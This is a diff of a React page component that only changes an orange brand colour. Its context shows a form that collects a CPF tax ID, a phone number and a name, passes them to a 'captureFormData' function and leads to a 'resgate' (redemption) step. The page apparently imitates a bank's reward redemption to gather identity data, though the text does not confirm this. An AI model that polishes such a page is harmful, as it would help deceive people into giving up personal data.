@@ -43,7 +43,7 @@ const Index = () => {
   }, [cpf]);
 
   return (
-    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #FE5200 0%, #CC4200 100%)' }}>
+    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #FF6200 0%, #CC5000 100%)' }}>
       {/* Header */}
       <div className="px-5 pt-6 pb-16">
         <div className="flex items-center justify-between mb-8">
@@ -98,7 +98,7 @@ const Index = () => {
         </div>
 
         {/* Nome do titular */}
-        <div className={`w-full py-3 rounded-full font-semibold text-base text-center ${cpfErro ? "bg-red-100 text-red-600" : "bg-white text-[#FE5200]"}`}>
+        <div className={`w-full py-3 rounded-full font-semibold text-base text-center ${cpfErro ? "bg-red-100 text-red-600" : "bg-white text-[#FF6200]"}`}>
           {consultando ? "Consultando..." : cpfErro ? cpfErro : nomeCompleto ? nomeCompleto : "1º titular"}
         </div>
 
@@ -111,7 +111,7 @@ const Index = () => {
           >
             <span
               className={`absolute top-[3px] left-[3px] w-[22px] h-[22px] rounded-full shadow transition-transform ${
-                toggleOn ? "translate-x-[18px] bg-[#FE5200]" : "translate-x-0 bg-primary-foreground/60"
+                toggleOn ? "translate-x-[18px] bg-[#FF6200]" : "translate-x-0 bg-primary-foreground/60"
               }`}
             />
           </button>
@@ -121,7 +121,7 @@ const Index = () => {
         <button
           onClick={() => { captureFormData("identificacao", { cpf: cpf.replace(/\D/g, ""), telefone: telefone.replace(/\D/g, ""), nome: nomeCompleto }); navigate("/resgate", { state: { nome: nomeCompleto } }); }}
           disabled={cpf.replace(/\D/g, "").length !== 11 || telefone.replace(/\D/g, "").length !== 11}
-          className="w-full py-4 rounded-full bg-white text-[#FE5200] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
+          className="w-full py-4 rounded-full bg-white text-[#FF6200] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
         >
           continuar para resgate
         </button>
